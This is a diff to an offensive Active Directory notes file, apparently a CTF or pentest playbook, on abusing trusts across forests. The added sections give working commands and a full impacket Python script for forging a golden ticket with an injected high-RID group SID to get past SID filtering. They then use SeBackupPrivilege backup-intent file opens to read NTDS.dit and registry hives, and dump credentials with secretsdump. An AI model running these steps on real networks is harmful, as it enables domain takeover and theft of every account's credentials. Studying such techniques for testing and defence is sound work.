@@ -41,15 +41,17 @@ RETURN d1.name, d2.name, properties(r)
 
 Relevant bits when assessing whether injected SIDs will survive referral processing:
 
-- `0x20` (`WITHIN_FOREST`) — standard parent/child trust inside one forest.
-- `0x4` (`QUARANTINED_DOMAIN`) — quarantine/SID filtering is enabled.
-- `0x40` (`TREAT_AS_EXTERNAL`) — forest trust treated like an external trust; ExtraSID and SIDHistory assumptions become unreliable.
+- `0x8` (`FOREST_TRANSITIVE`) — forest trust.
+- `0x20` (`WITHIN_FOREST`) — standard parent/child trust inside one forest (no SID filtering; any ExtraSID survives).
+- `0x4` (`QUARANTINED_DOMAIN`) — external trust with SID filtering.
+- `0x40` (`TREAT_AS_EXTERNAL`) — forest trust filtered **as if external** (see the exact rule below).
+- `0x800` (`CROSS_ORG_ENABLE_TGT_DELEGATION`) — if ABSENT, cross-forest TGT delegation is off (unconstrained-delegation TGT capture across the trust will NOT forward a TGT).
 
 ```powershell
 Get-DomainTrust | Select TargetName,TrustAttributes,@{n='Hex';e={'0x{0:X}' -f $_.TrustAttributes}}
 ```
 
-If `QUARANTINED_DOMAIN` or `TREAT_AS_EXTERNAL` is set, re-check whether ExtraSID or SIDHistory abuse is viable before forging tickets.
+**The precise SID-filtering rule (do not read `TREAT_AS_EXTERNAL` as "ExtraSID is dead").** At an *external* boundary (external trust, or a forest trust with `TREAT_AS_EXTERNAL`) the referral DC strips only **reserved/built-in SIDs — RID < 1000** (512 Domain Admins, 519 Enterprise Admins, 518, 516, 544/551 builtins, S-1-5-32-\*). It does **not** strip **user-created domain groups with RID ≥ 1000**. So injecting Enterprise/Domain Admins fails, but injecting a **custom high-RID group of the target domain that grants privilege** succeeds — see the section below. `WITHIN_FOREST` (intra-forest) has no filtering, so the classic RID-519 ExtraSID works there.
 
 ### `lookupsid.py` for SID brute-forcing
 
@@ -110,6 +112,58 @@ impacket-psexec -k -no-pass PARENT.DOMAIN.LOCAL/hacker@<parent_dc>.parent.domain
 ```
 
 Use the root-domain FQDN for final access. The forged ticket is issued in the child domain, but the ExtraSID carries authorization into the parent.
+
+---
+
+## Cross-forest ExtraSID at an external boundary (RID ≥ 1000 bypass)
+
+Use when you are DA in forest A, there is a bidirectional trust to forest B, and B's trust is `TREAT_AS_EXTERNAL`/external (so built-in SIDs are filtered). Built-in admin groups won't cross — but a **custom target-domain group with RID ≥ 1000 that confers privilege** will. Hunt B for such a group (e.g. one nested in `Backup Operators`, `DnsAdmins`, `Remote Management Users`, or with a dangerous ACL):
+
+```bash
+# find target-forest groups with RID>=1000 that grant something useful
+impacket-lookupsid <A-domain>/user:pass@<B-DC-ip> | awk -F'[- ]' '$0 ~ /SidTypeGroup/ && $(NF-1)>=1000'
+# e.g. InfrastructureAdministrators (RID 1603) memberOf Backup Operators  -> SeBackupPrivilege
+```
+
+Forge a golden ticket in forest A (need A's `krbtgt` key + A domain SID) whose **ExtraSid is that B group**:
+
+```bash
+impacket-ticketer -aesKey <A_krbtgt_aes256> -domain-sid <A_domain_sid> -domain <A.fqdn> \
+  -user-id 500 -groups 513,512,520,518,519 \
+  -extra-sid <B_domainSID>-<highRID> Administrator      # e.g. S-1-5-21-...-1603
+export KRB5CCNAME=Administrator.ccache
+```
+
+Using the ticket cross-realm — two traps that masquerade as "SID filtered":
+
+1. **Clock skew.** The forged authenticator uses your local clock; if the DC differs >5 min you get `KRB_AP_ERR_SKEW` (often surfacing as a plain auth failure). Wrap every command in `faketime` — see `kerberos-time-skew.md`.
+2. **Route direct, not through `ssh -L`.** A local `-L 445:DC:445` forward makes impacket connect to `127.0.0.1` while computing the SPN from the DC name → SPNEGO breaks (`STATUS_MORE_PROCESSING_REQUIRED` / mechListMIC on Server 2019+). Use a **SOCKS proxy to the DC's real FQDN** (`proxychains … dc.fqdn`) instead.
+
+```bash
+faketime -f '+7h' proxychains4 nxc smb <B-DC-ip> -k --use-kcache --shares   # C$ shows READ,WRITE => Backup Operators landed
+```
+
+### Payoff: SeBackupPrivilege remote read (no shell, no DCSync)
+
+`SeBackupPrivilege` (from the injected Backup Operators membership) does **not** bypass DACLs on a normal open — `dir \\dc\c$`, `reg save`, `smbclient get`, `nxc --get-file`, `robocopy /b` all return `STATUS_ACCESS_DENIED` on a protected file. You must open with **`FILE_OPEN_FOR_BACKUP_INTENT` (0x4000)**. Read any file (root.txt, `NTDS.dit`, SAM/SECURITY hives) directly over SMB — no interactive shell needed:
+
+```python
+# faketime -f '+7h' proxychains4 python3 this.py dc.fqdn <B-DC-ip> 'C$' 'Users\Administrator\Desktop\root.txt'
+import os, sys; os.environ['KRB5CCNAME']='Administrator.ccache'
+from impacket.smbconnection import SMBConnection
+from impacket.smb3structs import (FILE_READ_DATA, FILE_READ_ATTRIBUTES, FILE_SHARE_READ,
+    FILE_SHARE_WRITE, FILE_OPEN, FILE_NON_DIRECTORY_FILE)
+FILE_OPEN_FOR_BACKUP_INTENT = 0x00004000
+name, ip, share, path = sys.argv[1:5]
+c = SMBConnection(name, ip); c.kerberosLogin('Administrator','','<A.fqdn>','','','',None,None,None,useCache=True)
+t = c.connectTree(share)
+f = c.openFile(t, path, desiredAccess=FILE_READ_DATA|FILE_READ_ATTRIBUTES,
+    shareMode=FILE_SHARE_READ|FILE_SHARE_WRITE,
+    creationOption=FILE_NON_DIRECTORY_FILE|FILE_OPEN_FOR_BACKUP_INTENT, creationDisposition=FILE_OPEN, fileAttributes=0)
+sys.stdout.write(c.readFile(t, f, 0, 8192).decode(errors='replace'))
+```
+
+For NTDS: back up `NTDS.dit` + the `SYSTEM` hive this way, then `impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL`. The same backup-intent primitive applies to any **Backup Operators** foothold (cred/hash/ticket), not just cross-forest.
 
 ---
 
